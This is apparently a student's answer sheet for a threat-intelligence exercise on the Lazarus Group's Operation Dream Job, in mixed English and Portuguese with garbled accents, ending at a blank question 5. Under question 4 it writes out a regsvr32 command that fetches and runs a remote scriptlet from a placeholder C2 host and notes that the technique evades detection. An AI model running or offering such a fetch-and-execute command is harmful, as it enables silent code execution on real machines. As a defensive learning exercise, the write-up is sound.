# Solution

You are a junior threat intelligence analyst at a Cybersecurity firm. You have been tasked with investigating a Cyber espionage campaign known as Operation Dream Job. The goal is to gather crucial information about this operation.

https://attack.mitre.org/campaigns/C0022/ (Site do MITRE ATT&CK sobre a campanha Dream Job);

## 1. Who conducted Operation Dream Job?

Operation Dream Job was a cyber espionage operation likely conducted by Lazarus Group that targeted the defense, aerospace, government, and other sectors in the United States, Israel, Australia, Russia, and India.

## 2. When was this operation first observed?

First Seen:  September 2019

## 3. There are 2 campaigns associated with Operation Dream Job. One is Operation North Star, what is the other?

Foram duas: Operation North Star e Operation Interception.

## 4. During Operation Dream Job, there were the two system binaries used for proxy execution. One was Regsvr32, what was the other?

`Regsvr32`: O regsvr32.exe � um programa do Windows que �avisa� ao sistema onde encontrar bibliotecas (arquivos .dll) e controles ActiveX, gravando ou removendo essas informa��es no Registro do Windows para que outros programas possam us�-los corretamente.O grupo Lazarus hospedou um arquivo de scriptlet COM (extens�o .sct) em um servidor remoto e invocou o bin�rio regsvr32.exe com par�metros que desabilitam o registro e habilitam a execu��o silenciosa.


Como: regsvr32.exe /s /n /u /i:http://c2.exemplo.com/malicioso.sct scrobj.dll; Evas�o de detec��o: n�o h� altera��es no Registro, o que reduz alertas em ferramentas que monitoram a persist�ncia tradicional.

Isso foi feito conjuntamente com o `Rundll32`: Proxy de execu��o (T1218.011): permite rodar c�digo malicioso como DLL, em vez de um execut�vel, evitando gatilhos em solu��es de seguran�a que n�o monitoram rundll32.exe;

## 5.	
